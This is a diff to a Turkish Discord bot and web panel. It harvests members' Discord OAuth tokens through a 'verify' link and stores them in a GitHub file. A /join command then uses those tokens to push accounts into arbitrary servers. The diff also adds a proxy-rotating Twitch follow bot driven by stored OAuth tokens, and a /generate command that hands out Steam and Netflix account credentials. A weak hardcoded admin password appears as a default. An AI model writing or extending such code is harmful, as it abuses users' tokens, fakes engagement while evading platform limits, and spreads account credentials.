@@ -20,7 +20,12 @@ load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
 CLIENT_ID = "1567282004901241065"
 CLIENT_SECRET = os.getenv("CLIENT_SECRET")
-OWNER_ID = int(os.getenv("OWNER_ID", 0))
+
+# ÇOKLU OWNER ID SİSTEMİ
+_raw_owners = os.getenv("OWNER_ID", "0")
+OWNER_ID_LIST = [int(x.strip()) for x in _raw_owners.split(",") if x.strip().isdigit()]
+OWNER_ID = OWNER_ID_LIST[0] if OWNER_ID_LIST else 0
+
 REDIRECT_URI = "https://kanki-6k6m.onrender.com/callback"
 WEB_PORT = int(os.getenv("PORT", 10000))
 ADMIN_PASSWORD = os.getenv("WEB_PASSWORD", "ravex123")
@@ -35,7 +40,8 @@ AUTH_FILE = "auth_tokens.json"
 STAFF_ROLES = [1566432003560181891, 1560996761659515003]
 EXCLUSIVE_ROLE = 1560688907199184986
 PREMIUM_ROLE = 1560316365951475852
-JOIN_ROLE = 1560292397982810173
+JOIN_ROLE = 1560292397982810173        # VERIFY ROLÜ
+UNVERIFIED_ROLE = 1560292397982810174  # UNVERIF ROLÜ (KENDİ ID'Nİ GİR)
 TICKET_LOG_CHANNEL = 1566423675480186951
 VOUCH_CHANNEL = 1566423691301093437
 PREMIUM_EXCLUSIVE_CHANNEL = 1566423682371420273
@@ -57,17 +63,68 @@ async def read_github_file(filename):
                 data = await resp.json()
                 content = base64.b64decode(data['content']).decode('utf-8')
                 return json.loads(content), data['sha']
-            if "twitch" in filename or "auth" in filename: return [], None
+            if "auth" in filename: return {"users": []}, None
+            if "twitch" in filename: return [], None
             return {"steam": [], "netflix": [], "used": []}, None
 
 async def write_github_file(filename, data, sha):
     url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{filename}"
-    content = base64.b64encode(json.dumps(data, indent=2).encode('utf-8')).decode('utf-8')
+    content = base64.b64encode(json.dumps(data, indent=2, ensure_ascii=False).encode('utf-8')).decode('utf-8')
     payload = {"message": "Bot Guncellemesi", "content": content}
     if sha: payload["sha"] = sha
     async with aiohttp.ClientSession() as session:
         async with session.put(url, headers=await github_get_headers(), json=payload) as resp:
             return resp.status in [200, 201]
+
+# ==================== TWITCH FOLLOWER ====================
+class TwitchFollower:
+    def __init__(self):
+        self.proxies = self._load_proxies()
+        self.proxy_index = 0
+
+    def _load_proxies(self):
+        proxies = []
+        if os.path.exists("proxies.txt"):
+            with open("proxies.txt", "r") as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.isspace():
+                        if '://' not in line: line = f"http://{line}"
+                        proxies.append(line)
+        return proxies
+
+    async def get_user_id(self, user):
+        headers = {"Client-Id": "kimne78kx3ncx6brgo4mv6wki5h1ko", "Content-Type": "application/json"}
+        payload = json.dumps([{"operationName": "GetIDFromLogin", "variables": {"login": user}, "extensions": {"persistedQuery": {"version": 1, "sha256Hash": "94e82a7b1e3c21e186daa73ee2afc4b8f23bade1fbbff6fe8ac133f50a2f58ca"}}}])
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.post("https://gql.twitch.tv/gql", headers=headers, data=payload) as response:
+                    if response.status == 200:
+                        data = await response.json()
+                        if data and isinstance(data, list) and data[0].get("data") and data[0]["data"].get("user"):
+                            return data[0]["data"]["user"]["id"]
+        except: pass
+        return False
+
+    async def execute_follow(self, target_id, token):
+        headers = {"Accept": "application/json", "Authorization": f"OAuth {token}", "Content-Type": "application/json"}
+        payload = json.dumps([{"operationName": "FollowUserMutation", "variables": {"targetId": str(target_id), "disableNotifications": False}, "extensions": {"persistedQuery": {"version": 1, "sha256Hash": "cd112d9483ede85fa0da514a5657141c24396efbc7bac0ea3623e839206573b8"}}}])
+        max_retries = len(self.proxies) if self.proxies else 1
+        for _ in range(max_retries):
+            proxy_url = None
+            if self.proxies:
+                proxy_url = self.proxies[self.proxy_index % len(self.proxies)]
+                self.proxy_index += 1
+            try:
+                async with aiohttp.ClientSession() as session:
+                    async with session.post("https://gql.twitch.tv/gql", data=payload, headers=headers, proxy=proxy_url) as response:
+                        if response.status in (200, 204):
+                            if "errors" not in (await response.text()).lower(): return True
+                        if proxy_url in self.proxies: self.proxies.remove(proxy_url)
+            except: 
+                if proxy_url in self.proxies: self.proxies.remove(proxy_url)
+            await asyncio.sleep(0.5)
+        return False
 
 # ==================== WEB PANELİ ====================
 HTML_HOME = """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Ravex System</title><style>body{background:#121212;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column;}h1{color:#5865F2;}.menu{display:flex;gap:20px;margin-top:20px;}.btn{padding:15px 30px;border-radius:8px;text-decoration:none;color:white;font-weight:bold;font-size:18px;transition:0.2s;}.btn-admin{background:#e74c3c;}.btn-admin:hover{background:#c0392b;}.btn-free{background:#2ecc71;}.btn-free:hover{background:#27ae60;}</style></head><body><h1>Ravex System</h1><div class="menu"><a href="/admin" class="btn btn-admin">Admin Login</a><a href="/free" class="btn btn-free">Free Login</a></div></body></html>"""
@@ -145,19 +202,41 @@ def callback():
             async with session.post("https://discord.com/api/oauth2/token", data=data, headers=headers) as resp:
                 if resp.status == 200:
                     access_token = (await resp.json()).get("access_token")
-                    async with github_lock:
-                        tokens, sha = await read_github_file(AUTH_FILE)
-                        tokens.append(access_token)
-                        await write_github_file(AUTH_FILE, tokens, sha)
                     user_headers = {"Authorization": f"Bearer {access_token}"}
                     async with session.get("https://discord.com/api/v10/users/@me", headers=user_headers) as u_resp:
                         if u_resp.status == 200:
-                            user_id = (await u_resp.json())["id"]
+                            user_data = await u_resp.json()
+                            user_id = user_data["id"]
+                            username = user_data.get("username", "Bilinmeyen")
+                            global_name = user_data.get("global_name") or username
+
+                            async with github_lock:
+                                data_file, sha = await read_github_file(AUTH_FILE)
+                                if "users" not in data_file: data_file = {"users": []}
+                                existing_user = next((u for u in data_file["users"] if u.get("user_id") == user_id), None)
+                                if existing_user:
+                                    existing_user["token"] = access_token
+                                    existing_user["username"] = username
+                                    existing_user["global_name"] = global_name
+                                    existing_user["timestamp"] = int(time.time())
+                                else:
+                                    data_file["users"].append({
+                                        "user_id": user_id,
+                                        "username": username,
+                                        "global_name": global_name,
+                                        "token": access_token,
+                                        "timestamp": int(time.time())
+                                    })
+                                await write_github_file(AUTH_FILE, data_file, sha)
+                            
                             if guild_id:
                                 bot_headers = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
-                                async with session.put(f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{JOIN_ROLE}", headers=bot_headers) as r_resp:
-                                    if r_resp.status not in [200, 204]:
-                                        print(f"Rol verilemedi: {await r_resp.text()}")
+                                try:
+                                    async with session.delete(f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{UNVERIFIED_ROLE}", headers=bot_headers): pass
+                                except: pass
+                                try:
+                                    async with session.put(f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{JOIN_ROLE}", headers=bot_headers): pass
+                                except: pass
                     return True
         return False
     if run_async(get_token_and_role()): return "<h1 style='color:lightgreen;text-align:center;padding-top:100px;'>✅ Başarıyla Yetkilendirildi!</h1>"
@@ -171,19 +250,14 @@ class MyBot(commands.Bot):
         intents = discord.Intents.default()
         intents.message_content = True
         intents.members = True
-        # DİKKAT: Prefix boş bırakıldı, sadece slash komutları çalışır.
         super().__init__(command_prefix=commands.when_mentioned, intents=intents)
         self.cooldowns = {}
 
     async def setup_hook(self):
-        # SUNUCUYA ÖZEL ANLIK SENKRONİZASYON
         print("Bot başlatılıyor, komutlar senkronize ediliyor...")
         try:
-            # Önce global senkronize et
             synced = await self.tree.sync()
             print(f"[+] Global olarak {len(synced)} komut senkronize edildi.")
-            
-            # Sonra her sunucuya özel anında yükle
             for guild in self.guilds:
                 self.tree.copy_global_to(guild=guild)
                 await self.tree.sync(guild=guild)
@@ -195,12 +269,6 @@ class MyBot(commands.Bot):
         print(f"[+] Bot aktif: {self.user.name} ({self.user.id})")
         if not any(t.name == "WebServerThread" for t in threading.enumerate()):
             threading.Thread(target=run_web, daemon=True, name="WebServerThread").start()
-
-    async def on_member_join(self, member):
-        role = member.guild.get_role(JOIN_ROLE)
-        if role:
-            try: await member.add_roles(role)
-            except: pass
 
 bot = MyBot()
 
@@ -214,11 +282,57 @@ def set_limit(user_id, type_):
     if user_id not in bot.cooldowns: bot.cooldowns[user_id] = {}
     bot.cooldowns[user_id][type_] = time.time()
 
+# ==================== TICKET SİSTEMİ ====================
+class TicketSelectMenu(discord.ui.Select):
+    def __init__(self):
+        options = [
+            discord.SelectOption(label="Support", emoji="🎧", value="Support"), 
+            discord.SelectOption(label="General", emoji="💬", value="General")
+        ]
+        super().__init__(placeholder="Select a category...", min_values=1, max_values=1, options=options, custom_id="ticket_menu_select")
+    async def callback(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+        await create_ticket(interaction, self.values[0])
+
+class TicketMenuView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+        self.add_item(TicketSelectMenu())
+
+class TicketControlView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+    @discord.ui.button(label="Claim", emoji="🙋‍♂️", style=discord.ButtonStyle.success, custom_id="t_claim")
+    async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not any(r.id in STAFF_ROLES for r in interaction.user.roles): return await interaction.response.send_message("❌ Staff only.", ephemeral=True)
+        button.disabled = True; button.label = f"Claimed by {interaction.user.name}"
+        await interaction.message.edit(view=self); await interaction.response.send_message(f"✅ {interaction.user.mention} claimed.", ephemeral=False)
+    @discord.ui.button(label="Close", emoji="🔒", style=discord.ButtonStyle.danger, custom_id="t_close")
+    async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not any(r.id in STAFF_ROLES for r in interaction.user.roles): return await interaction.response.send_message("❌ Staff only.", ephemeral=True)
+        await interaction.response.send_message("🔒 Closing in 5s..."); await asyncio.sleep(5); await interaction.channel.delete()
+
+async def create_ticket(interaction: discord.Interaction, category: str):
+    guild = interaction.guild
+    overwrites = {guild.default_role: discord.PermissionOverwrite(read_messages=False), interaction.user: discord.PermissionOverwrite(read_messages=True)}
+    t_num = len([c for c in guild.channels if c.name.startswith("ticket-")]) + 1
+    try:
+        channel = await guild.create_text_channel(name=f"ticket-{t_num}", overwrites=overwrites)
+        embed = discord.Embed(title=f"Ticket #{t_num}", description=f"Category: **{category}**\nOpened by: {interaction.user.mention}")
+        await channel.send(embed=embed, view=TicketControlView())
+        await interaction.followup.send(f"✅ Created: {channel.mention}", ephemeral=True)
+    except Exception as e: await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
+
 # ==================== SLASH KOMUTLARI ====================
+
+@bot.tree.command(name="ticket", description="Ticket panelini gönderir")
+async def ticket_cmd(interaction: discord.Interaction):
+    embed = discord.Embed(title="🎟️ Destek Sistemi", description="Aşağıdaki menüden bir kategori seçerek ticket açabilirsin.", color=discord.Color.blurple())
+    await interaction.response.send_message(embed=embed, view=TicketMenuView())
 
 @bot.tree.command(name="verify", description="Doğrulama butonu gönderir (Owner Only)")
 async def verify_cmd(interaction: discord.Interaction):
-    if interaction.user.id != OWNER_ID: return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
+    if interaction.user.id not in OWNER_ID_LIST: return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
     await interaction.response.defer()
     auth_link = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=guilds.join+identify&state={interaction.guild.id}"
     embed = discord.Embed(title="✅ Sunucu Doğrulama", description="Aşağıdaki butona tıklayarak Discord hesabını doğrula ve sunucuya erişim yetkisi kazan.", color=discord.Color.green())
@@ -226,23 +340,51 @@ async def verify_cmd(interaction: discord.Interaction):
     view.add_item(discord.ui.Button(label="Doğrula / Authorize", style=discord.ButtonStyle.link, url=auth_link))
     await interaction.followup.send(embed=embed, view=view)
 
-@bot.tree.command(name="working", description="Bota kaç kişinin yetki verdiğini gösterir (Owner Only)")
+@bot.tree.command(name="working", description="Bota yetki verenleri listeler (Sadece Kurucu)")
 async def working_cmd(interaction: discord.Interaction):
-    if interaction.user.id != OWNER_ID: return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
+    if interaction.user.id not in OWNER_ID_LIST: return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
     await interaction.response.defer(ephemeral=True)
-    tokens_data = await read_github_file(AUTH_FILE)
-    count = len([t for t in tokens_data[0] if t.strip()])
-    embed = discord.Embed(title="📊 Bot Durumu", description=f"Şu an bota **{count}** kişi yetki vermiş durumda.", color=discord.Color.blue())
+    data_file, _ = await read_github_file(AUTH_FILE)
+    users = data_file.get("users", [])
+    if not users: return await interaction.followup.send("📭 Henüz kimse yetki vermemiş.", ephemeral=True)
+    embed = discord.Embed(title="📊 Yetki Verenler", description=f"Toplam **{len(users)}** kişi yetki vermiş.", color=discord.Color.blue())
+    for u in users[:25]:
+        name = u.get("global_name") or u.get("username", "Bilinmeyen")
+        uid = u.get("user_id", "0")
+        embed.add_field(name=f"👤 {name}", value=f"ID: `{uid}` | <@{uid}>", inline=False)
+    if len(users) > 25: embed.set_footer(text=f"Toplam {len(users)} kişiden ilk 25'i gösteriliyor.")
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@bot.tree.command(name="join", description="İzin veren hesapları Sunucu ID'si ile sunucuya sokar")
-@app_commands.describe(sunucu_id="Sunucunun ID'si", kac_adam="Kaç adam çekilecek")
+@bot.tree.command(name="unyetki", description="Bir kişinin yetkisini siler")
+@app_commands.describe(kullanici="Yetkisi silinecek kişi")
+async def unyetki_cmd(interaction: discord.Interaction, kullanici: discord.Member):
+    if interaction.user.id not in OWNER_ID_LIST and not any(r.id in STAFF_ROLES for r in interaction.user.roles):
+        return await interaction.response.send_message("⛔ Kurucu veya Yetkili olmalısın.", ephemeral=True)
+    await interaction.response.defer(ephemeral=True)
+    async with github_lock:
+        data_file, sha = await read_github_file(AUTH_FILE)
+        users = data_file.get("users", [])
+        user_id_str = str(kullanici.id)
+        filtered_users = [u for u in users if u.get("user_id") != user_id_str]
+        removed = len(users) - len(filtered_users)
+        if removed == 0: return await interaction.followup.send(f"❌ {kullanici.mention} yetki verenler arasında yok.", ephemeral=True)
+        data_file["users"] = filtered_users
+        await write_github_file(AUTH_FILE, data_file, sha)
+    try:
+        if kullanici.get_role(JOIN_ROLE): await kullanici.remove_roles(interaction.guild.get_role(JOIN_ROLE), reason="Yetki silindi")
+        if kullanici.get_role(UNVERIFIED_ROLE): await kullanici.add_roles(interaction.guild.get_role(UNVERIFIED_ROLE), reason="Yetki silindi")
+    except: pass
+    await interaction.followup.send(f"✅ {kullanici.mention} yetkisi silindi. Tekrar verify yaparsa listeye yeniden eklenir.", ephemeral=True)
+
+@bot.tree.command(name="join", description="Yetki verenleri belirtilen sunucuya sokar")
+@app_commands.describe(sunucu_id="Hedef sunucunun ID'si", kac_adam="Kaç kişi sokulacak")
 async def join_cmd(interaction: discord.Interaction, sunucu_id: str, kac_adam: int = 10):
-    if interaction.user.id != OWNER_ID: return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
+    if interaction.user.id not in OWNER_ID_LIST: return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
     await interaction.response.defer()
     guild_id = sunucu_id.strip()
-    tokens_data = await read_github_file(AUTH_FILE)
-    current_tokens = [t.strip() for t in tokens_data[0] if t.strip()]
+    data_file, _ = await read_github_file(AUTH_FILE)
+    users = data_file.get("users", [])
+    current_tokens = [u["token"] for u in users if u.get("token")]
     if not current_tokens: return await interaction.followup.send("❌ Kimse izin vermemiş!")
     selected_tokens = random.sample(current_tokens, min(kac_adam, len(current_tokens)))
     msg = await interaction.followup.send(f"⏳ **{guild_id}** ID'li sunucuya {len(selected_tokens)} hesap sokuluyor...")
@@ -261,26 +403,91 @@ async def join_cmd(interaction: discord.Interaction, sunucu_id: str, kac_adam: i
                     else: fail += 1
         except: fail += 1
         await asyncio.sleep(1.5)
-    await msg.edit(content=f"✅ Bitti!\nHedef Sunucu ID: **{guild_id}**\n\n✔️ Başarılı: **{success}**\n❌ Başarısız: **{fail}**")
+    await msg.edit(content=f"✅ Bitti!\nHedef Sunucu ID: **{guild_id}**\n\n✔️ Başarılı: **{success}**\n❌ Başarısız: **{fail}**\n\nℹ️ `/working` listesi değişmedi.")
 
-@bot.tree.command(name="ekle", description="Stok ekler (Owner Only)")
-@app_commands.describe(plan="Plan türü", service="Servis türü", hesaplar="Hesapları alt alta yapıştır")
+@bot.tree.command(name="generate", description="Hesap üretir")
 @app_commands.choices(
-    plan=[app_commands.Choice(name="Normal", value="normal"), app_commands.Choice(name="Premium", value="premium"), app_commands.Choice(name="Exclusive", value="exclusive")],
-    service=[app_commands.Choice(name="Steam", value="steam"), app_commands.Choice(name="Netflix", value="netflix")]
+    service=[app_commands.Choice(name="Netflix", value="netflix"), app_commands.Choice(name="Steam", value="steam")],
+    plan=[app_commands.Choice(name="Normal", value="normal"), app_commands.Choice(name="Premium", value="premium"), app_commands.Choice(name="Exclusive", value="exclusive")]
 )
-async def ekle_cmd(interaction: discord.Interaction, plan: app_commands.Choice[str], service: app_commands.Choice[str], hesaplar: str):
-    if interaction.user.id != OWNER_ID: return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
-    await interaction.response.defer(ephemeral=True)
-    lines = [line.strip() for line in hesaplar.split("\n") if line.strip()]
-    if not lines: return await interaction.followup.send("❌ Boş hesap listesi.", ephemeral=True)
+async def generate_cmd(interaction: discord.Interaction, service: app_commands.Choice[str], plan: app_commands.Choice[str]):
+    user_roles, svc, pln = [r.id for r in interaction.user.roles], service.value, plan.value
+    if pln in ["premium", "exclusive"] and interaction.channel_id != PREMIUM_EXCLUSIVE_CHANNEL:
+        return await interaction.response.send_message(f"❌ Use in <#{PREMIUM_EXCLUSIVE_CHANNEL}>.", ephemeral=True)
+    if pln == "premium" and PREMIUM_ROLE not in user_roles: return await interaction.response.send_message("❌ No Premium role.", ephemeral=True)
+    if pln == "exclusive" and EXCLUSIVE_ROLE not in user_roles: return await interaction.response.send_message("❌ No Exclusive role.", ephemeral=True)
+    await interaction.response.defer() 
+    limit_ok, t_left = check_limit(interaction.user.id, f"{svc}_{pln}")
+    if not limit_ok: return await interaction.followup.send(f"❌ Limit reached. Wait {t_left//3600}h.", ephemeral=True)
     async with github_lock:
-        stock, sha = await read_github_file(STOK_FILES[plan.value])
-        if service.value == "steam": stock["steam"].extend(lines)
-        else: stock["netflix"].extend(lines)
-        success = await write_github_file(STOK_FILES[plan.value], stock, sha)
-    if success: await interaction.followup.send(f"✅ **{len(lines)}** adet hesap **{plan.name} / {service.name}** stoklarına eklendi!", ephemeral=True)
-    else: await interaction.followup.send("❌ Stok eklenirken hata oluştu.", ephemeral=True)
+        stock, sha = await read_github_file(STOK_FILES[pln])
+        acc = None
+        if svc == "steam":
+            lines = stock.get("steam", [])
+            for i in range(0, len(lines), 2):
+                if i+1 < len(lines):
+                    a = f"{lines[i]}\n{lines[i+1]}"
+                    if a not in stock.get("used", []): acc = a; stock["used"].append(a); break
+        else:
+            for line in stock.get("netflix", []):
+                if line not in stock.get("used", []): acc = line; stock["used"].append(line); break
+        if acc: await write_github_file(STOK_FILES[pln], stock, sha)
+    if not acc: return await interaction.followup.send(f"❌ {pln.capitalize()} out of stock for {svc}!", ephemeral=True)
+    set_limit(interaction.user.id, f"{svc}_{pln}")
+    auth_link = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=guilds.join+identify&state={interaction.guild.id}"
+    try:
+        if svc == "steam":
+            await interaction.user.send(f"🎁 **Steam ({pln.capitalize()})**\n\n```\n{acc}\n```")
+            await interaction.user.send(f"🔗 **Do authorize for verify:**\n{auth_link}")
+            await interaction.followup.send(f"✅ Generated, Check DMs!")
+        else:
+            await interaction.followup.send(f"✅ Generated, Check DMs!")
+            # TÜM OWNER'LARA DM AT
+            for owner_id in OWNER_ID_LIST:
+                owner = await bot.fetch_user(owner_id)
+                if owner:
+                    embed = discord.Embed(title=f"🎬 Netflix Request", color=discord.Color.red())
+                    embed.add_field(name="User", value=f"{interaction.user.mention}"); embed.add_field(name="Acc", value=f"```{acc}```")
+                    try: await owner.send(embed=embed)
+                    except: pass
+    except discord.Forbidden: await interaction.followup.send("❌ DMs closed.", ephemeral=True)
+
+@bot.tree.command(name="tfollow", description="Twitch takipçi gönder")
+async def tfollow_cmd(interaction: discord.Interaction, twitch_ismi: str, adet: int = 10):
+    if interaction.user.id not in OWNER_ID_LIST: return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
+    await interaction.response.defer()
+    tokens_data = await read_github_file(TWITCH_FILE)
+    current_tokens = [t.strip() for t in tokens_data[0] if t.strip()]
+    if not current_tokens: return await interaction.followup.send("❌ Token yok!")
+    follower = TwitchFollower()
+    target_id = await follower.get_user_id(twitch_ismi)
+    if not target_id: return await interaction.followup.send(f"❌ Kanal bulunamadı.")
+    msg = await interaction.followup.send(f"⏳ **{twitch_ismi}** için işlem başlatıldı...")
+    selected_tokens = random.sample(current_tokens, min(adet, len(current_tokens)))
+    success, fail = 0, 0
+    for token in selected_tokens:
+        if await follower.execute_follow(target_id, token): success += 1
+        else: fail += 1
+        await asyncio.sleep(1.0)
+    await msg.edit(content=f"✅ Bitti!\n🎯 Hedef: **{twitch_ismi}**\n✔️ Başarılı: **{success}**\n❌ Başarısız: **{fail}**")
+
+@bot.tree.command(name="delete", description="Delete messages")
+async def delete_cmd(interaction: discord.Interaction, amount: int, empty_only: bool = True):
+    if not any(r.id in STAFF_ROLES for r in interaction.user.roles) and interaction.user.id not in OWNER_ID_LIST: return await interaction.response.send_message("❌ Staff only.", ephemeral=True)
+    await interaction.response.defer(ephemeral=True)
+    try:
+        if empty_only:
+            cnt = 0
+            async for msg in interaction.channel.history(limit=amount):
+                if not msg.content.strip() or not msg.content.isprintable():
+                    try: await msg.delete(); cnt += 1
+                    except: pass
+            await interaction.followup.send(f"✅ Silindi: {cnt} boş mesaj.", ephemeral=True)
+        else: 
+            await interaction.channel.purge(limit=amount)
+            await interaction.followup.send(f"✅ Silindi: {amount} mesaj.", ephemeral=True)
+    except Exception as e: 
+        await interaction.followup.send(f"❌ Hata: {e}", ephemeral=True)
 
 # ==================== BOTU BAŞLATMA ====================
 if __name__ == "__main__":
